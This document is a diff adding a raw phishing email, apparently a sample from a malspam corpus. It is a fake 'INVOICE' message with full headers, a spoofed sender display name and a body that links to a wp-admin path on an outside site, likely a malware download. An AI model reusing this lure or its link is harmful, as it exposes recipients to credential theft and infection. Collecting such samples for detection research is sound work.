@@ -1,0 +1,54 @@
+ARC-Authentication-Results: i=1; owright@jg4llcjwh0.net;
+       dkim=pass header.i=@djhndgzcz8.biz header.s=default header.b=pxvaLr12;
+       spf=pass (owright@jg4llcjwh0.net: domain of lineacovid@djhndgzcz8.biz designates 138.255.101.211 as permitted sender) smtp.mailfrom=lineacovid@djhndgzcz8.biz
+Return-Path: <lineacovid@djhndgzcz8.biz>
+Received: from djhndgzcz8.biz (djhndgzcz8.biz. [138.255.101.211])
+        by owright@jg4llcjwh0.net with ESMTPS id o17si370053qki.381.2020.07.20.13.11.58
+        for owright@jg4llcjwh0.net
+        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
+        Mon, 20 Jul 2020 13:11:58 -0700 (PDT)
+Received-SPF: pass (owright@jg4llcjwh0.net: domain of lineacovid@djhndgzcz8.biz designates 138.255.101.211 as permitted sender) client-ip=138.255.101.211;
+Authentication-Results: owright@jg4llcjwh0.net;
+       dkim=pass header.i=@djhndgzcz8.biz header.s=default header.b=pxvaLr12;
+       spf=pass (owright@jg4llcjwh0.net: domain of lineacovid@djhndgzcz8.biz designates 138.255.101.211 as permitted sender) smtp.mailfrom=lineacovid@djhndgzcz8.biz
+Message-ID: <5f15fa8e.1c69fb81.4ee9.88f6SMTPIN_ADDED_MISSING@owright@jg4llcjwh0.net>
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=djhndgzcz8.biz
+	; s=default; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Subject:To
+	:From:Date:Sender:Reply-To:Message-ID:Cc:Content-ID:Content-Description:
+	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
+	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
+	List-Post:List-Owner:List-Archive;
+	bh=JZFCPd23lNmPEHRpAjn14em7IkpDlJ9Kd23filiSaS0=; b=pxvaLr12QA2FC1+EkNjI8i4B8d
+	/M9r4LNlQm7G3QAYIgBmUzjxcRp5QNSAOMuoGbLZ9NraILgelut2mPmbeuf2TaQNTh2Oi9zKDUKTO
+	vbkZApiXqmI818ulTu/sTJxaTDGoPqm66tZXpGOVFBWPpMmPjZy18CnAJbRMTnBQlF33CSQQ7fOMU
+	rRXhzkNdILWLo4E6SN4EoqEU/btkU/uWzZ+GlqfdeyDxCHOJGVM3endTlVYTw2G2cfDRho+1ED6eD
+	DIFnjhJQ9pO9R6SFljypgav82vxAScVsE97QGFBSj0Zzjbz3/llpLouFEt4tEMEns8NyCT1AnstuA
+	8Fmp5lDA==;
+Received: from [181.36.206.248] (port=64650)
+	by cp6.zglobalhost.com with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.93)
+	(envelope-from <lineacovid@djhndgzcz8.biz>)
+	id 1jxc8f-0003zH-BA
+	for owright@jg4llcjwh0.net; Mon, 20 Jul 2020 16:11:54 -0400
+Date: Mon, 20 Jul 2020 15:41:57 -0430
+From: "owright@jg4llcjwh0.net <owright@jg4llcjwh0.net@owright@jg4llcjwh0.net>" <lineacovid@djhndgzcz8.biz>
+To:owright@jg4llcjwh0.net
+Subject: INVOICE 1136505 from [recipient's email domain]
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+X-Get-Message-Sender-Via: cp6.zglobalhost.com: authenticated_id: lineacovid@djhndgzcz8.biz
+X-Authenticated-Sender: cp6.zglobalhost.com: lineacovid@djhndgzcz8.biz
+
+<html>
+<body>
+See attached.=0D
+<br>
+<br>
+<a href=3D"http://navidrayan.ir/wp-admin/v8-9i-358651/">http://navidrayan.i=
+r/wp-admin/v8-9i-358651/</a>
+<br>
+<br>
+<i>[recipient's email domain]</i>
+</body>
+</html>
